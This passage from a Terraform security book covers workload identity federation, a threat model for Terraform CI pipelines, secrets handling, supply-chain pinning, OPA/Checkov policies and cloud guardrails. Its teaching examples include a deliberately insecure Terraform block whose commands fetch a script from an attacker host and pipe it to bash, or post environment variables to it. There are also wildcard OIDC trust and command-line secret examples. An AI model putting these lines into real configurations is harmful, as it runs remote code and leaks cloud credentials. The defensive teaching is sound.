resource "google_iam_workload_identity_pool" "github" {
  workload_identity_pool_id = "github-pool"
  display_name              = "GitHub Actions"
  project                   = var.project_id
}

resource "google_iam_workload_identity_pool_provider" "github" {
  workload_identity_pool_id          = google_iam_workload_identity_pool.github.workload_identity_pool_id
  workload_identity_pool_provider_id = "github-provider"
  project                            = var.project_id

  oidc {
    issuer_uri = "https://token.actions.githubusercontent.com"
  }

  attribute_mapping = {
    "google.subject"        = "assertion.sub"
    "attribute.repository"  = "assertion.repository"
    "attribute.ref"         = "assertion.ref"
    "attribute.environment" = "assertion.environment"
  }

  # ⚠️ REQUIRED. Without an attribute_condition, ANY GitHub repository
  # in the world can authenticate to your project.
  attribute_condition = "assertion.repository == 'acme/infrastructure'"
}

# Grant directly to the principalSet — no service account needed
resource "google_project_iam_member" "terraform_apply" {
  project = var.project_id
  role    = "roles/editor"
  member  = "principalSet://iam.googleapis.com/${google_iam_workload_identity_pool.github.name}/attribute.environment/production"
}
```

**Service account impersonation** (works with every API, including some that do not accept federated tokens directly):

```hcl
resource "google_service_account" "terraform" {
  account_id   = "terraform-apply"
  display_name = "Terraform apply"
  project      = var.project_id
}

resource "google_service_account_iam_member" "github" {
  service_account_id = google_service_account.terraform.name
  role               = "roles/iam.workloadIdentityUser"
  member             = "principalSet://iam.googleapis.com/${google_iam_workload_identity_pool.github.name}/attribute.environment/production"
}
```

In the workflow:

```yaml
permissions:
  contents: read
  id-token: write

steps:
  - uses: google-github-actions/auth@v3
    with:
      workload_identity_provider: projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider
      service_account: terraform-apply@acme-prod.iam.gserviceaccount.com   # omit for direct WIF
```

⚠️ **The token lifetime problem.** Direct Workload Identity Federation issues tokens with a limited lifetime (historically around one hour, shorter in some configurations). A Terraform apply that runs longer than the token's life fails partway through with 401s against the GCS backend. If your applies are long, use service account impersonation with a refreshed token, or split the stack.

### 39.5 The GCS backend with WIF

```hcl
terraform {
  backend "gcs" {
    bucket                      = "acme-tfstate"
    prefix                      = "apps/api/production"
    impersonate_service_account = "terraform-apply@acme-prod.iam.gserviceaccount.com"
  }
}
```

The `google-github-actions/auth` action writes a credentials file and sets `GOOGLE_APPLICATION_CREDENTIALS`, which the GCS backend picks up automatically.

### 39.6 Multi-cloud in one configuration

You can, and occasionally should:

```hcl
provider "aws" {
  region = "ap-south-1"
}

provider "google" {
  project = var.gcp_project_id
  region  = "asia-south1"
}

# e.g. a DNS record in Route53 pointing at a Cloud Run service
resource "aws_route53_record" "gcp_api" {
  zone_id = var.route53_zone_id
  name    = "gcp-api.example.com"
  type    = "CNAME"
  ttl     = 300
  records = [google_cloud_run_v2_service.api.uri]
}
```

⚠️ **Be deliberate about this.** A stack spanning two clouds has two credential sets, two failure domains and two blast radii. Usually you want separate stacks with an SSM/Secret Manager contract between them (Chapter 28). The legitimate case is a genuinely cross-cloud resource like the DNS record above.

---
# Part VII — Security

---

## Chapter 40 — A Threat Model for Terraform

### 40.1 Why your Terraform pipeline is a high-value target

Your CI apply role can create, modify and destroy your entire infrastructure. It is, in practical terms, the most powerful identity in your organisation. An attacker who controls it does not need to breach your application — they can simply create an IAM user for themselves, or exfiltrate every database snapshot.

```mermaid
flowchart TD
    A["Attacker objective:<br/>control your infrastructure<br/>or steal its data"]
    A --> V1["1. Steal the state file"]
    A --> V2["2. Compromise a provider<br/>or a module"]
    A --> V3["3. Malicious PR that runs<br/>with apply credentials"]
    A --> V4["4. Plan-time code execution"]
    A --> V5["5. Over-broad OIDC trust policy"]
    A --> V6["6. Over-broad apply IAM role"]
    A --> V7["7. Compromise a CI action"]
    A --> V8["8. Secrets in logs, plans<br/>or PR comments"]

    V1 --> D1["Encrypt state with CMK ·<br/>per-key IAM scoping ·<br/>no secrets in state"]
    V2 --> D2["Commit .terraform.lock.hcl ·<br/>pin module ?ref to a SHA ·<br/>vendor security-critical modules"]
    V3 --> D3["plan on pull_request with a<br/>READ-ONLY role · apply only from<br/>a protected environment"]
    V4 --> D4["Ban external data sources ·<br/>ban local-exec · review provider<br/>additions carefully"]
    V5 --> D5["Exact-match the sub claim on<br/>environment · never repo:org/repo:*"]
    V6 --> D6["Permission boundary on the<br/>apply role · deny Delete on<br/>stateful types"]
    V7 --> D7["Pin every action to a 40-char SHA"]
    V8 --> D8["Never print plan output for<br/>stacks holding secrets ·<br/>redact before commenting"]
```

### 40.2 Threat 1 — state file exposure

**What an attacker gets:** a complete inventory of your infrastructure (reconnaissance), plus any secret that a resource returned — RDS passwords set the old way, generated keys, anything read through a secrets data source.

**Real-world paths to exposure:**
- State committed to git. Still the most common.
- An S3 state bucket without a public access block.
- An IAM policy granting `s3:GetObject` on `arn:aws:s3:::tfstate/*` rather than one key.
- `terraform_remote_state` giving a low-trust stack read access to a high-trust stack's state.
- A CI job printing `terraform show -json` output into a log.

**Controls:**

```hcl
# Bucket-level
resource "aws_s3_bucket_public_access_block" "tfstate" { /* all four true */ }
resource "aws_s3_bucket_server_side_encryption_configuration" "tfstate" { /* SSE-KMS */ }
resource "aws_s3_bucket_versioning" "tfstate" { /* Enabled */ }

# Deny any access not over TLS and not from the expected principals
data "aws_iam_policy_document" "tfstate" {
  statement {
    sid    = "DenyInsecureTransport"
    effect = "Deny"
    principals { type = "*", identifiers = ["*"] }
    actions   = ["s3:*"]
    resources = [aws_s3_bucket.tfstate.arn, "${aws_s3_bucket.tfstate.arn}/*"]
    condition {
      test     = "Bool"
      variable = "aws:SecureTransport"
      values   = ["false"]
    }
  }
}
```

Plus: per-state-key IAM (Chapter 18), and keeping secrets out of state entirely (Chapter 41).

🔬 **OpenTofu users get an additional control: client-side state encryption**, which means even someone with full bucket read access cannot read the state without the key. This is genuinely the strongest argument for OpenTofu.

```hcl
terraform {
  encryption {
    key_provider "aws_kms" "main" {
      kms_key_id = "alias/tfstate-encryption"
      region     = "ap-south-1"
      key_spec   = "AES_256"
    }
    method "aes_gcm" "main" {
      keys = key_provider.aws_kms.main
    }
    state {
      method = method.aes_gcm.main
    }
    plan {
      method = method.aes_gcm.main
    }
  }
}
```

### 40.3 Threat 2 — supply chain (providers and modules)

A provider is a binary that runs on your CI runner with your cloud credentials. A module is code that runs with the same. Both are supply chain.

Covered in depth in Chapter 42.

### 40.4 Threat 3 — the malicious pull request

```mermaid
sequenceDiagram
    participant A as Attacker
    participant F as Fork
    participant CI as GitHub Actions
    participant AWS as AWS

    A->>F: fork the infra repo
    A->>F: add a resource that creates an IAM user<br/>with AdministratorAccess and an access key,<br/>writing the key to a public S3 bucket
    A->>CI: open a pull request

    alt ⚠️ BAD — workflow runs apply, or plan with a write role
        CI->>AWS: assume terraform-apply
        AWS-->>CI: write credentials
        CI->>AWS: creates the backdoor IAM user
        Note over A,AWS: 💀 Full compromise
    else ✅ GOOD — pull_request runs plan with a READ-ONLY role
        CI->>AWS: assume terraform-plan (ReadOnlyAccess)
        CI->>CI: plan shows "+ aws_iam_user.backdoor"
        CI->>CI: policy check FAILS on iam:* creation
        Note over CI: Reviewer sees it. Nothing applied.
    end
```

**The controls, all of which you need:**

1. `pull_request` workflows use the **read-only plan role**.
2. The apply role's OIDC trust policy requires `environment:production` in the `sub` claim — which a PR job cannot obtain without triggering environment protection.
3. GitHub setting: **"Require approval for all external contributors"** on fork PR workflow runs.
4. A policy gate (Chapter 43) that fails the plan on IAM creation, public S3, or security group rules open to the world.
5. CODEOWNERS requiring review on `.github/workflows/` — otherwise an attacker just edits the workflow.

⚠️ **Number 5 is the one people miss.** If a PR can modify the workflow file that runs on that PR, every other control is bypassable. Protect `.github/` with CODEOWNERS and require review.

### 40.5 Threat 4 — plan-time code execution

A `terraform plan` is not a safe read-only operation if the configuration contains these:

```hcl
# ⚠️ INTENTIONALLY INSECURE — all three execute during PLAN
data "external" "evil" {
  program = ["bash", "-c", "curl -s https://attacker.example.com/x | bash"]
}

resource "null_resource" "evil" {
  provisioner "local-exec" {
    command = "env | curl -X POST --data-binary @- https://attacker.example.com/exfil"
  }
}

provider "malicious" {
  # A provider binary is downloaded and EXECUTED during init
}
```

The `external` data source runs during plan. Provisioners run during apply — but a plan on a compromised runner still has the OIDC token in its environment.

**Controls:**
- Ban `external`, `null_resource` with `local-exec`, and `http` data sources to non-allowlisted hosts. Enforce with a policy check on the configuration, not just the plan.
- Require review on any PR that adds a new `required_providers` entry.
- Run plan with the read-only role so exfiltrated credentials are worth little.
- Use a short OIDC session (`max_session_duration = 3600`).

```rego
# policies/no_dangerous_sources.rego
package terraform.security

deny contains msg if {
  r := input.configuration.root_module.resources[_]
  r.type == "null_resource"
  msg := "null_resource is not permitted; use a proper resource or an out-of-band job"
}

deny contains msg if {
  d := input.configuration.root_module.data_resources[_]
  d.type == "external"
  msg := "The external data source executes arbitrary code at plan time and is not permitted"
}
```

### 40.6 Threat 5 — over-broad OIDC trust

```json
// ⚠️ INTENTIONALLY INSECURE
"Condition": {
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:acme/*"
  }
}
```

This lets **any workflow in any repository in the org, on any branch, including a fork PR**, assume the role. Fix in Chapter 46.

### 40.7 Threat 6 — the apply role is admin

Most teams give the Terraform apply role `AdministratorAccess` because scoping it is tedious. Then a single compromised workflow file is a full account takeover.

**The pragmatic middle ground** (Chapter 31.5): grant broad permissions but attach a **permission boundary** that denies the handful of actions that would be catastrophic — deleting the state bucket, deleting the OIDC provider, scheduling KMS key deletion, leaving the organisation, deleting IAM roles.

### 40.8 Threat 7 — compromised GitHub Actions

⚠️ **In March 2026, attackers force-pushed malicious code to 76 of 77 tags in `aquasecurity/trivy-action` (CVE-2026-33634).** A security scanner became a credential stealer, in workflows that had done nothing wrong except use a mutable tag.

```yaml
# ⚠️ mutable — the tag can be repointed at any commit at any time
- uses: aquasecurity/trivy-action@0.28.0

# ✅ immutable
- uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 # v0.35.0
```

**Controls:**
- Pin every third-party action to a 40-character commit SHA, with the version in a trailing comment so Dependabot can bump it.
- Organisation setting: **"Require actions to be pinned to a full-length commit SHA."**
- Allowed-actions allowlist.
- First-party (`actions/*`, `hashicorp/*`, `aws-actions/*`, `google-github-actions/*`) can reasonably use major tags.

### 40.9 Threat 8 — secrets in plans, logs and PR comments

A plan shows the values of arguments. If a resource takes a secret as an argument, that secret is in the plan output — and your PR-comment workflow just posted it publicly.

**Controls:**
- Keep secrets out of resource arguments (Chapter 41).
- For stacks that unavoidably handle secrets, **do not post the plan as a PR comment**. Post a summary of counts and resource addresses, and link to the run log which is access-controlled.
- Never `echo` a Terraform output without checking whether it is sensitive.
- Never upload the plan file as a public artifact. A `.tfplan` contains everything.

---

## Chapter 41 — Secrets and Sensitive Data

### 41.1 How secrets get into state

```mermaid
flowchart TD
    S["Secret value"] --> P1["1. Passed as a variable<br/>var.db_password"]
    S --> P2["2. Generated by Terraform<br/>random_password"]
    S --> P3["3. Read via a data source<br/>data.aws_secretsmanager_secret_version"]
    S --> P4["4. Returned by a resource<br/>aws_iam_access_key.secret"]
    S --> P5["5. Stored in a resource<br/>aws_secretsmanager_secret_version"]

    P1 --> ST["STATE FILE<br/>plaintext"]
    P2 --> ST
    P3 --> ST
    P4 --> ST
    P5 --> ST

    ST --> E1["Every S3 version of the state,<br/>retained for a year"]
    ST --> E2["Anyone with state read access"]
    ST --> E3["Any downstream stack using<br/>terraform_remote_state"]
    ST --> E4["Any CI log that printed state"]
```

### 41.2 The four mechanisms, precisely

| Mechanism | Version | Value in state? | Value in plan file? | What it is actually for |
|---|---|---|---|---|
| `sensitive = true` | any | ✅ **Yes** | ✅ Yes | Redacting CLI/UI output. **Not a security control** |
| `ephemeral` resource/variable/output | 1.10+ | ❌ No | ❌ No | Reading a secret to configure something |
| Write-only argument (`*_wo`) | 1.11+ | ❌ No | ❌ No | Passing a secret *into* a resource |
| Not handling it at all (ARN reference) | any | N/A | N/A | **The best option where available** |

### 41.3 The hierarchy of solutions

**Best — Terraform never touches the value:**

```hcl
# RDS: AWS generates, stores and rotates
resource "aws_db_instance" "main" {
  manage_master_user_password = true
}

# ECS: the agent resolves the ARN at task start
container_definitions = jsonencode([{
  secrets = [
    { name = "DB_PASSWORD", valueFrom = aws_db_instance.main.master_user_secret[0].secret_arn }
  ]
}])

# Cloud Run: same idea
env {
  name = "DB_PASSWORD"
  value_source {
    secret_key_ref { secret = google_secret_manager_secret.db.secret_id, version = "latest" }
  }
}
```

**Good — write-only arguments:**

```hcl
# 🔬 Terraform 1.11+ / OpenTofu 1.11+
ephemeral "aws_secretsmanager_secret_version" "api_key" {
  secret_id = aws_secretsmanager_secret.api_key.id
}

resource "some_service_config" "main" {
  api_key_wo         = ephemeral.aws_secretsmanager_secret_version.api_key.secret_string
  api_key_wo_version = var.api_key_version   # increment to force an update
}
```

⚠️ **The `_wo_version` companion is mandatory and easy to misunderstand.** Because Terraform cannot store the value, it cannot detect that it changed. The version integer is how *you* tell Terraform "the secret changed, push it again". Forget to bump it and a rotated secret is never propagated.

**Acceptable — Terraform manages the container, not the value:**

```hcl
resource "aws_secretsmanager_secret" "api_key" {
  name       = "${var.environment}/${var.name}/api-key"
  kms_key_id = var.kms_key_arn
}
# No secret_version resource. A human or a Lambda sets the value.
```

**Last resort — `random_password`, accepting state exposure:**

```hcl
resource "random_password" "internal_token" {
  length  = 48
  special = false
}
```

Acceptable only when: the value is genuinely low-impact, state access is tightly controlled, and there is no better option.

### 41.4 What to do when a secret has leaked into state

⚠️ **Removing it from state does not fix anything.** Assume it is compromised.

```mermaid
flowchart TD
    A["Secret found in state"] --> B["1. ROTATE THE SECRET IMMEDIATELY.<br/>This is the only step that<br/>actually restores security."]
    B --> C["2. Determine exposure:<br/>who had s3:GetObject on the state?<br/>Check CloudTrail for GetObject calls."]
    C --> D["3. Fix the configuration so the<br/>new secret does not enter state."]
    D --> E["4. Decide about state history:<br/>old S3 versions still contain it."]
    E --> F{"Was the exposure<br/>outside your trust boundary?"}
    F -->|"yes"| G["Purge old state versions —<br/>⚠️ this destroys your recovery window.<br/>Take a fresh backup first."]
    F -->|"no"| H["Leave history; the rotated<br/>secret makes it worthless."]
    G --> I["5. Document it. Add a policy<br/>check so it cannot recur."]
    H --> I
```

### 41.5 Secrets in CI

```yaml
# ⚠️ INTENTIONALLY BAD — the secret appears in the process list and in `set -x` output
- run: terraform apply -var="db_password=${{ secrets.DB_PASSWORD }}"

# ✅ Better — environment variable, never on the command line
- run: terraform apply -auto-approve
  env:
    TF_VAR_db_password: ${{ secrets.DB_PASSWORD }}

# ✅✅ Best — no secret in CI at all; the resource fetches it itself
- run: terraform apply -auto-approve
  # The configuration uses manage_master_user_password or an ephemeral read.
```

⚠️ **Never upload a `.tfplan` as a public artifact.** A plan file contains the full planned state, including every secret value that would be written. Mark plan artifacts with short retention and remember that anyone with repo read access can download workflow artifacts.

### 41.6 Rotation

```hcl
resource "aws_secretsmanager_secret_rotation" "db" {
  secret_id           = aws_db_instance.main.master_user_secret[0].secret_arn
  rotation_lambda_arn = aws_lambda_function.rotator.arn

  rotation_rules {
    automatically_after_days = 30
  }
}
```

With `manage_master_user_password`, AWS provides rotation natively. For third-party secrets you need a rotation Lambda, and your application must handle the secret changing under it — which means reading the secret at connection time, not once at startup.

---

## Chapter 42 — Provider and Module Supply Chain

### 42.1 The lock file is a security control

```hcl
# .terraform.lock.hcl — COMMIT THIS
provider "registry.terraform.io/hashicorp/aws" {
  version     = "6.66.0"
  constraints = "~> 6.66"
  hashes = [
    "h1:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=",
    "zh:0123456789abcdef0123456789abcdef01234567",
    # ... one per platform
  ]
}
```

`terraform init` verifies the downloaded provider against these hashes. A tampered binary fails to install.

⚠️ **The lock file only protects you if it is complete for every platform you use.** Generate it for all of them:

```bash
terraform providers lock \
  -platform=linux_amd64 \
  -platform=linux_arm64 \
  -platform=darwin_arm64 \
  -platform=darwin_amd64
```

Make this a Makefile target and run it whenever you change a provider version.

### 42.2 Module source pinning

| Source form | Security | Verdict |
|---|---|---|
| `?ref=main` | ❌ None | Never |
| `?ref=v1.2` | ⚠️ Tag is mutable | Acceptable for internal modules you control |
| `?ref=v1.2.3` | ⚠️ Tag is mutable | Standard practice |
| `?ref=<40-char SHA>` | ✅ Immutable | **For anything security-relevant** |
| Registry + `version = "~> 1.2"` | ⚠️ Registry-dependent | Standard for public modules |
| Vendored (copied into your repo) | ✅ Fully controlled | For critical modules; you own maintenance |

### 42.3 Evaluating a module before adopting it

- [ ] Who maintains it, and is that a real organisation?
- [ ] Commits in the last three months?
- [ ] Does it create IAM? If so, **read that code**.
- [ ] Does it contain `provisioner`, `external`, or `null_resource`? Those are code execution.
- [ ] Does it contact any host other than your cloud provider?
- [ ] Does it have tests?
- [ ] How many open issues, and do maintainers respond?

### 42.4 A private mirror

For an air-gapped or high-assurance environment:

```hcl
# .terraformrc
provider_installation {
  network_mirror {
    url = "https://terraform-mirror.internal.acme.com/"
  }
  direct {
    exclude = ["registry.terraform.io/*/*"]
  }
}
```

Combined with `terraform providers mirror ./mirror-dir`, this gives you a reviewed, internally-hosted set of provider binaries.

### 42.5 Dependabot for Terraform

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: terraform
    directories:
      - "/stacks/**"
      - "/modules/**"
    schedule:
      interval: weekly
      day: monday
    groups:
      providers:
        patterns: ["*"]
        update-types: [minor, patch]
    open-pull-requests-limit: 5
    labels: [dependencies, terraform]

  - package-ecosystem: github-actions
    directory: "/"
    schedule: { interval: weekly }
    groups:
      actions:
        patterns: ["*"]
```

🧠 Dependabot understands SHA-pinned actions and updates both the SHA and the version comment. This makes SHA pinning practical rather than a maintenance burden.

---

## Chapter 43 — Policy as Code and IaC Scanning

### 43.1 Where each tool fits

```mermaid
flowchart LR
    A["*.tf files"] --> B["tflint<br/>correctness, provider rules,<br/>deprecated syntax"]
    A --> C["Checkov / Trivy<br/>security misconfigurations<br/>against the CONFIG"]
    D["terraform plan -out=tfplan"] --> E["terraform show -json<br/>→ plan.json"]
    E --> F["Conftest / OPA<br/>custom org policy<br/>against the PLAN"]
    E --> G["Checkov --framework terraform_plan<br/>fewer false positives<br/>than scanning config"]
    E --> H["Infracost<br/>💰 cost diff"]
    B --> I["PR gate"]
    C --> I
    F --> I
    G --> I
    H --> J["PR comment"]
```

🧠 **Scanning the *plan* is meaningfully better than scanning the *configuration*.** The plan has all variables resolved, all modules expanded, and all defaults applied. Config scanning produces false positives on things a variable would have set correctly, and false negatives on things a module sets badly.

### 43.2 tflint

```hcl
# .tflint.hcl
plugin "terraform" {
  enabled = true
  preset  = "recommended"
}

plugin "aws" {
  enabled = true
  version = "0.42.0"
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}

plugin "google" {
  enabled = true
  version = "0.34.0"
  source  = "github.com/terraform-linters/tflint-ruleset-google"
}

rule "terraform_naming_convention" {
  enabled = true
  format  = "snake_case"
}

rule "terraform_documented_variables" { enabled = true }
rule "terraform_documented_outputs"   { enabled = true }
rule "terraform_typed_variables"      { enabled = true }
rule "terraform_unused_declarations"  { enabled = true }
rule "terraform_required_version"     { enabled = true }
rule "terraform_required_providers"   { enabled = true }
rule "terraform_module_pinned_source" {
  enabled = true
  style   = "flexible"
}
```

tflint catches things no security scanner does: an invalid instance type, a deprecated argument, an undocumented variable, an unpinned module source.

### 43.3 Checkov

```yaml
# .checkov.yml
framework:
  - terraform_plan
quiet: true
compact: true
skip-check:
  - CKV_AWS_144   # Cross-region replication — not required for this workload
  - CKV2_AWS_6    # Duplicated by our own tag policy
soft-fail-on:
  - LOW
hard-fail-on:
  - CRITICAL
  - HIGH
```

Inline suppressions require a reason:

```hcl
resource "aws_s3_bucket" "public_assets" {
  bucket = "acme-public-assets"
  # checkov:skip=CKV_AWS_20:This bucket intentionally serves public static assets via CloudFront
}
```

**Recommendation:** every suppression must carry a justification and, ideally, a review date. An unexplained `skip-check` list grows until the scanner is useless.

### 43.4 Custom policy with OPA/Conftest

```rego
# policies/terraform/production.rego
package terraform.production

import rego.v1

# --- Databases must not be publicly accessible ---
deny contains msg if {
  r := input.resource_changes[_]
  r.type in {"aws_db_instance", "aws_rds_cluster"}
  "create" in r.change.actions
  r.change.after.publicly_accessible == true
  msg := sprintf("%s: RDS must not be publicly accessible", [r.address])
}

# --- Databases must be encrypted ---
deny contains msg if {
  r := input.resource_changes[_]
  r.type == "aws_db_instance"
  r.change.after.storage_encrypted != true
  msg := sprintf("%s: storage_encrypted must be true", [r.address])
}

# --- Production databases must have deletion protection ---
deny contains msg if {
  input.variables.environment.value == "production"
  r := input.resource_changes[_]
  r.type in {"aws_db_instance", "aws_rds_cluster"}
  r.change.after.deletion_protection != true
  msg := sprintf("%s: deletion_protection is required in production", [r.address])
}

# --- No security group open to the world except on 443 ---
deny contains msg if {
  r := input.resource_changes[_]
  r.type == "aws_vpc_security_group_ingress_rule"
  r.change.after.cidr_ipv4 == "0.0.0.0/0"
  not r.change.after.from_port == 443
  msg := sprintf("%s: 0.0.0.0/0 ingress is only permitted on port 443", [r.address])
}

# --- No IAM policy with Action:* on Resource:* ---
deny contains msg if {
  r := input.resource_changes[_]
  r.type in {"aws_iam_policy", "aws_iam_role_policy"}
  doc := json.unmarshal(r.change.after.policy)
  s := doc.Statement[_]
  s.Effect == "Allow"
  "*" in array_or_single(s.Action)
  "*" in array_or_single(s.Resource)
  msg := sprintf("%s: wildcard Action on wildcard Resource is not permitted", [r.address])
}

array_or_single(x) := x if is_array(x)
array_or_single(x) := [x] if not is_array(x)

# --- Required tags on every created AWS resource ---
required_tags := {"Project", "Environment", "ManagedBy", "Owner", "CostCenter"}

deny contains msg if {
  r := input.resource_changes[_]
  "create" in r.change.actions
  startswith(r.type, "aws_")
  r.change.after.tags_all
  missing := required_tags - object.keys(r.change.after.tags_all)
  count(missing) > 0
  msg := sprintf("%s: missing required tags %v", [r.address, missing])
}

# --- WARN on anything destructive in production ---
warn contains msg if {
  input.variables.environment.value == "production"
  r := input.resource_changes[_]
  "delete" in r.change.actions
  msg := sprintf("%s will be DESTROYED — confirm this is intended", [r.address])
}
```

```bash
terraform plan -out=tfplan
terraform show -json tfplan > plan.json
conftest test --policy policies/ --all-namespaces plan.json
```

### 43.5 The tool comparison

| Tool | Scans | Strength | Weakness |
|---|---|---|---|
| **tflint** | Config | Provider-specific correctness, style, deprecations | No security rules to speak of |
| **Checkov** | Config or plan | Enormous rule library, good AWS/GCP/K8s coverage | Noisy; needs a suppression discipline |
| **Trivy** | Config, plan, images, SBOM | One tool for IaC and containers | ⚠️ See the 2026 supply-chain note |
| **Conftest/OPA** | Plan JSON | **Your** policies, arbitrarily expressive | You write and maintain the rules |
| **Sentinel** | Plan | Deep HCP Terraform integration | HCP/TFE only, proprietary language |
| **Infracost** | Plan | 💰 Cost diff in the PR | Estimates, not invoices |

**Recommendation for a small team:** tflint + Checkov (plan mode) + a small set of Conftest policies covering the rules that are specific to you (tags, naming, environment-conditional requirements). Add Infracost early — it changes behaviour more than any security tool, because engineers can see the cost of a change before merging.

---

## Chapter 44 — Guardrails, Audit and Compliance

### 44.1 Defence in depth

```mermaid
flowchart TD
    L1["Layer 1 — Author time<br/>pre-commit hooks: fmt, validate, tflint, checkov"] --> L2
    L2["Layer 2 — PR gate<br/>plan + policy checks + Infracost + human review"] --> L3
    L3["Layer 3 — Apply gate<br/>GitHub environment approval, branch restriction,<br/>OIDC sub claim on environment"] --> L4
    L4["Layer 4 — Cloud preventive controls<br/>SCPs, Organization Policies, permission boundaries<br/>— these stop it even if Terraform tries"] --> L5
    L5["Layer 5 — Detective controls<br/>AWS Config rules, GuardDuty, drift detection,<br/>CloudTrail alerting"]
```

🧠 **Layer 4 is the one that survives everything else failing.** Policy checks in CI are bypassable by someone who can edit the workflow. An SCP is not.

### 44.2 AWS Service Control Policies

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedRDS",
      "Effect": "Deny",
      "Action": ["rds:CreateDBInstance", "rds:CreateDBCluster"],
      "Resource": "*",
      "Condition": {
        "Bool": { "rds:StorageEncrypted": "false" }
      }
    },
    {
      "Sid": "DenyRegionsOutsidePolicy",
      "Effect": "Deny",
      "NotAction": [
        "iam:*", "sts:*", "organizations:*", "cloudfront:*",
        "route53:*", "support:*", "budgets:*"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": ["ap-south-1", "us-east-1"]
        }
      }
    },
    {
      "Sid": "ProtectStateBucket",
      "Effect": "Deny",
      "Action": ["s3:DeleteBucket", "s3:PutBucketPolicy", "s3:PutBucketVersioning"],
      "Resource": "arn:aws:s3:::acme-tfstate-*"
    },
    {
      "Sid": "DenyCloudTrailTampering",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail",
        "cloudtrail:UpdateTrail"
      ],
      "Resource": "*"
    },
    {
      "Sid": "DenyLeavingOrg",
      "Effect": "Deny",
      "Action": ["organizations:LeaveOrganization"],
      "Resource": "*"
    }
  ]
}
```

### 44.3 GCP Organization Policy equivalents

```hcl
resource "google_org_policy_policy" "disable_sa_keys" {
  name   = "projects/${var.project_id}/policies/iam.disableServiceAccountKeyCreation"
  parent = "projects/${var.project_id}"

  spec {
    rules { enforce = "TRUE" }
  }
}

resource "google_org_policy_policy" "restrict_locations" {
  name   = "projects/${var.project_id}/policies/gcp.resourceLocations"
  parent = "projects/${var.project_id}"

  spec {
    rules {
      values {
        allowed_values = ["in:asia-south1-locations", "in:asia-south2-locations"]
      }
    }
  }
}

resource "google_org_policy_policy" "no_public_ip" {
  name   = "projects/${var.project_id}/policies/compute.vmExternalIpAccess"
  parent = "projects/${var.project_id}"

  spec {
    rules { deny_all = "TRUE" }
  }
}
```

🧠 `iam.disableServiceAccountKeyCreation` is the GCP control that makes Workload Identity Federation mandatory rather than optional. Turn it on.

### 44.4 Detective controls

```hcl
resource "aws_config_config_rule" "rds_encrypted" {
  name = "rds-storage-encrypted"
  source {
    owner             = "AWS"
    source_identifier = "RDS_STORAGE_ENCRYPTED"
  }
}

resource "aws_config_config_rule" "s3_public_read" {
  name = "s3-bucket-public-read-prohibited"
  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}

resource "aws_config_config_rule" "required_tags" {
  name = "required-tags"
  source {
    owner             = "AWS"
    source_identifier = "REQUIRED_TAGS"
  }
  input_parameters = jsonencode({
    tag1Key = "Environment"
    tag2Key = "Owner"
    tag3Key = "ManagedBy"
  })
}
```

Plus CloudTrail alerting on the actions that should never happen:

```hcl
resource "aws_cloudwatch_log_metric_filter" "root_usage" {
  name           = "root-account-usage"
  log_group_name = aws_cloudwatch_log_group.cloudtrail.name
  pattern        = "{ $.userIdentity.type = \"Root\" && $.userIdentity.invokedBy NOT EXISTS && $.eventType != \"AwsServiceEvent\" }"

  metric_transformation {
    name      = "RootAccountUsage"
    namespace = "Acme/Security"
    value     = "1"
  }
}

resource "aws_cloudwatch_log_metric_filter" "terraform_state_access_denied" {
  name           = "tfstate-access-denied"
  log_group_name = aws_cloudwatch_log_group.cloudtrail.name
  pattern        = "{ $.errorCode = \"AccessDenied\" && $.requestParameters.bucketName = \"acme-tfstate-*\" }"

  metric_transformation {
    name      = "TfStateAccessDenied"
    namespace = "Acme/Security"
    value     = "1"
  }
}
```

### 44.5 Compliance evidence

Your pipeline generates the evidence auditors want, if you keep it:

| Control | Evidence |
|---|---|
| Changes are reviewed | GitHub PR history, CODEOWNERS approvals |
| Changes are tested | CI run logs: plan, policy checks, tests |
| Production changes are approved | GitHub environment approval records |
| Least privilege | IAM policy documents in git, permission boundaries |
| Encryption at rest | Config rules, plus the Terraform config itself |
| Change history | `git log` on the infrastructure repo |
| Who did what | CloudTrail with the OIDC session name containing the run ID |

🧠 **Make your `role_session_name` traceable:**

```yaml
- uses: aws-actions/configure-aws-credentials@v6
  with:
    role-to-assume: ${{ vars.TF_APPLY_ROLE }}
    role-session-name: tf-${{ github.actor }}-${{ github.run_id }}
```

Now every CloudTrail entry names the GitHub user and the run. "Who deleted that security group on 14 March?" becomes a one-query answer.

---
# Part VIII — CI/CD with GitHub Actions

You already know GitHub Actions. This part covers only what is specific to running Terraform in it — the parts that are genuinely different from building an application.

---

## Chapter 45 — Pipeline Architecture

### 45.1 The full picture

```mermaid
flowchart TD
    subgraph PR["Pull request — READ-ONLY credentials"]
        A1["Detect changed stacks"] --> A2["fmt · validate · tflint"]
        A2 --> A3["OIDC → terraform-plan role<br/>ReadOnlyAccess + state R/W"]
        A3 --> A4["terraform init + plan -out=tfplan"]
        A4 --> A5["Save tfplan as an artifact"]
        A4 --> A6["show -json → plan.json"]
        A6 --> A7["Checkov · Conftest · Infracost"]
        A6 --> A8["Post a collapsible plan comment"]
        A7 --> A9["Gate job"]
        A8 --> A9
    end

    A9 --> M["Merge to main"]

    subgraph APPLY["Apply — WRITE credentials, gated"]
        M --> B1["environment: production<br/>⏸ required reviewers<br/>⏸ branch restriction"]
        B1 --> B2["OIDC → terraform-apply role<br/>sub = repo:org/repo:environment:production"]
        B2 --> B3["Download the saved plan artifact<br/>OR re-plan — see 48.3"]
        B3 --> B4["terraform apply tfplan"]
        B4 --> B5["Post outputs to the run summary"]
        B5 --> B6["Notify Slack"]
    end

    subgraph SCHED["Scheduled"]
        C1["Nightly drift detection<br/>plan -detailed-exitcode"] --> C2["Open or update a GitHub issue"]
    end
```

### 45.2 The four design decisions

**1. Separate plan and apply roles.** Non-negotiable. See Chapter 31.4.

